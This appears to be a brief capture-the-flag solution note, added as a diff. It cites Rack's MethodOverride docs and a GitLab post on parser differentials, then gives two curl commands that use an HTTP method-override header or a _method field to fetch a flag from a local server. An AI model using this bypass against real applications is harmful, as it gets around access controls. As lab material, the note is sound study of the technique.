@@ -1,0 +1,8 @@
+# Source: 
+	https://www.rubydoc.info/gems/rack/Rack/MethodOverride
+	https://about.gitlab.com/blog/2020/03/30/how-to-exploit-parser-differentials/
+
+
+curl -X POST -H "X-HTTP-Method-Override: GET" http://localhost:8090/contents/FLAG
+OR
+curl -X POST -d "_method=GET" http://localhost:8090/contents/FLAG
